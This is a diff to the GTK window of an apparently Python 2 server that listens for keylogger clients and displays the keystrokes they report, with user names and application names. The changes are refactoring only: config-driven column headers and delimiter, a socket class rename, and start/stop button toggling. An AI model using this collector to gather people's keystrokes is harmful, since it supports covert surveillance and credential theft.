@@ -17,15 +17,11 @@ __email__ = "sunhick@gmail.com"
 import logging
 import thread
 
-from tcpsocket import ServerSocket
+from tcpsocket import TcpSocket
 from gi.repository import Gtk
 from gi.repository import Pango
 from threading import current_thread
 
-keylog_header = ['Time stamp',
-                 'User Name',
-                 'Application Id',
-                 'Key Strokes']
 
 class ServerWindow:
     """
@@ -40,13 +36,26 @@ class ServerWindow:
         self._builder.connect_signals(self)
         self._mainwindow = self._builder.get_object('server_window')
 
+        self._read_config()
         self._set_window_size()
         self._set_icons()
         self._setup_keylog_view()
-        self._server_sock = ServerSocket()
+        self._server_sock = TcpSocket()
 
 
     # ---------------------- Internal methods ------------------------
+
+    def _read_config(self):
+        from ConfigParser import ConfigParser
+
+        config = ConfigParser()
+        config.read('defaults.cfg')
+        self._delimiter = config.get('common', 'delimiter')
+        count = config.getint('common', 'column_count')
+        self._keylog_header = [config.get('common', 'column-' + str(i))
+                         for i in range(1, count + 1)]
+        self._log.debug('key log header = [{header}]'.format(header=self._keylog_header))
+        del config
 
     def _callback(self, data):
         """ 
@@ -61,15 +70,16 @@ class ServerWindow:
             self._log.debug('Data is empty, skipping')
             return
 
-        self._log.debug('Data at callback = [{d}]'.format(d=data))
+        # self._log.debug('Data at callback = [{d}]'.format(d=data))
         # Client contract: Will always send the data delimited by '|'
-        keylog = data.split('|')
+        keylog = data.split(self._delimiter)
+        self._log.debug('Parsed value = [{parsed}]'.format(parsed=keylog))
         self._listmodel.append(keylog)
 
     def _setup_keylog_view(self):
         # the data in the model (three strings for each row, one for each
         # column)
-        self._listmodel = Gtk.ListStore(str, str, str, str)
+        self._listmodel = Gtk.ListStore(str, str, str, str, str)
 
         # a treeview to see the data stored in the model
         self._view = Gtk.TreeView(model = self._listmodel)  # self._builder.get_object('keylog_view')
@@ -78,14 +88,14 @@ class ServerWindow:
         # self._view.set_grid_lines(True)
 
         # for each column
-        for i in range(len(keylog_header)):
+        for i in range(len(self._keylog_header)):
             # cellrenderer to render the text
             cell = Gtk.CellRendererText()
             # the text in the first column should be in boldface
             if i == 0:
                 cell.props.weight_set = True
                 # the column is created
-            col = Gtk.TreeViewColumn(keylog_header[i], cell, text=i)
+            col = Gtk.TreeViewColumn(self._keylog_header[i], cell, text=i)
             col.set_resizable(True)
             # and it is appended to the treeview
             self._view.append_column(col)
@@ -130,6 +140,12 @@ class ServerWindow:
 
         window.set_size_request(ww, wh)
 
+    def _toggle_start_stop_button(self, start_enabled):
+        startbtn = self._builder.get_object('start_button')
+        stopbtn = self._builder.get_object('stop_button')
+        startbtn.set_sensitive(start_enabled)
+        stopbtn.set_sensitive(not start_enabled)
+
     # ------------------- Public methods ------------------------------
     
     def get_top_level_window(self):
@@ -144,11 +160,13 @@ class ServerWindow:
     def start_listening(self, widget):
         self._log.debug('Clicked on Stop button')
         self._log.info('Starting listening to the key logger clients')
+        self._toggle_start_stop_button(False)
         thread.start_new_thread(self._server_sock.start, (self._callback,))
 
     def stop_listening(self, widget):
         self._log.debug('Clicked on Start button')
         self._log.info('Stop listening to the key logger clients')
+        self._toggle_start_stop_button(True)
         thread.start_new_thread(self._server_sock.stop, ())
 
     def aboutus(self, widget):
@@ -164,7 +182,6 @@ class ServerWindow:
 
     def information(self, widget):
         self._log.debug('Clicked on Information button')
-        self._listmodel.append(['Dec 21, 12:50AM', 'Sunil', 'Mozilla firefox', 'CTRL + C'])
 
     def hide(self, widget):
         self._log.debug('Clicked on hide button')
